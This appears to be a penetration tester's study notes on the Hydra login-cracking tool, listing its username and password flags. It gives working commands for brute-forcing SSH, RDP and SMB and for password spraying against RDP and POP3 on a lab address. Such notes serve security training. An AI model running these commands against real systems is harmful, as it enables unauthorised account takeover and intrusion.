Hydra is brute-forcing tool. We can basically automate login cracking for a wide range of protocols with it.

### Basic Hydra Tags

`-l` - Single username
`-L` - List of usernames
`-p` - Single password
`-P` - List of passwords

### Brute-forcing SSH with Hydra

```shell
hydra -L user.list -P password.list ssh://10.129.42.197
```

### Brute-forcing RDP with Hydra

```shell
hydra -L user.list -P password.list rdp://10.129.42.197
```

### Brute-forcing SMB with Hydra

```shell
hydra -L user.list -P password.list smb://10.129.42.197
```

>[!note]
> We may get the following error describing that the server has sent an invalid reply while brute-forcing SMB. This is because we most likely have an outdated version of THC-Hydra that cannot handle SMBv3 replies. To work around this problem, we can manually update and recompile `hydra` or use another tool, the [Metasploit framework](https://www.metasploit.com/).

### Hydra - RDP Password Spraying 

```sh
hydra -L usernames.txt -p 'password123' <ip> rdp
```

^456dd0

### Hydra - Mail Server Password attack

^164fa3

```sh
hydra -L users.txt -p 'password123' -f <ip> pop3
```

